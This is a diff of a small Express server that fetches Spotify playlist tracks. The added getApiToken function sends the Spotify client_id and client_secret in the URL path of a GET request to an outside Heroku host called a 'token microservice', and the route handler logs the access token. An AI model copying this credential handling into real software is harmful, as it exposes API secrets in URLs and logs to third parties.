@@ -8,22 +8,17 @@ const express = require('express');
 const app = express();
 const PORT = 3000;
 
-const getApiToken = async () => {
-  const clientCreds = Buffer.from(`${client_id}:${client_secret}`).toString('base64');
-  const tokenPromise = await fetch('https://accounts.spotify.com/api/token', {
-    method: 'POST',
-    headers: {
-      Authorization: `Basic ${clientCreds}`,
-      'Content-Type': 'application/x-www-form-urlencoded'
-    },
-    body: new URLSearchParams({
-      grant_type: 'client_credentials'
-    })
-  });
-  const { access_token } = (await tokenPromise.json());
-  return access_token;
-}
 
+const getApiToken = async () => {
+  const urlString = `https://helpmeeeeeee.herokuapp.com/credentials/${client_id}/${client_secret}`;
+
+  console.log("Sending request to token microservice, awaiting.");
+  const tokenPromise = await fetch(urlString);
+
+  console.log("Token received, parsing text.");
+  const token = await tokenPromise.text();
+  return token;
+}
 
 
 const getPlaylistTracks = async accessToken => {
@@ -44,37 +39,24 @@ const getPlaylistTracks = async accessToken => {
 }
 
 
-
-app.get('/', (req, res)=>{
+app.get('/', async (req, res, next)=>{
+  
   console.log('Get request received.');
-  getApiToken()
-    .then( token => {
-      console.log(`Token received: ${token}`);
-      console.log(typeof(token));
-      res.send(token);
-    })
-    .catch(err=>console.log(`There was an error:\n\n${err}`));
+
+  try {
+    // Get token
+    const token = await getApiToken()
+    console.log(`Token received and parsed: ${token}`);
+    
+    // Get playlist
+    const playlistItems = await getPlaylistTracks(token);
+    console.log(`Tracklist received: ${playlistItems}`);
+    
+    res.json(playlistItems);
+  } catch (err) {
+    console.error(`Error inside get route.\n${err}`);
+    next(err);
+  }
 });
 
 app.listen(PORT, ()=>console.log(`Server listening on port ${PORT}`));
-
-
-// const getOptions = {
-  //       url: 'https://api.spotify.com/v1/tracks/1DrlLvlYd1FIjNavRm6NdX',
-  //       headers: {
-  //         'Authorization': 'Bearer ' + token,
-  //         'Content-Type': 'application/json'
-  //       }
-  //     }
-  
-  //     request.get(getOptions, function(error, response, body) {
-  //       if (!error && response.statusCode === 200) {
-  //         console.log(response);
-  //         console.log(response.body.linked_from.preview_url);
-  //       } else {
-  //         console.log(error);
-  //         console.log(response);
-  //       }
-  //     })
-  //   }
-  // });
